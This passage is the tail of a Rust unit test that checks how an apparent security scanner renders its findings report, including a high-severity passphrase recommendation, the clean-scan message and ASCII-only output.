        assert!(r.contains("* High") && r.contains("x2") && r.contains("-> Add a passphrase"));
        let clean = render(&scan(vec![]), &Ignores::default(), &ascii);
        assert!(
            clean.contains("ok: Nothing to fix from the checks that ran."),
            "{clean}"
        );
        assert!(clean.is_ascii(), "{clean}");
    }
}
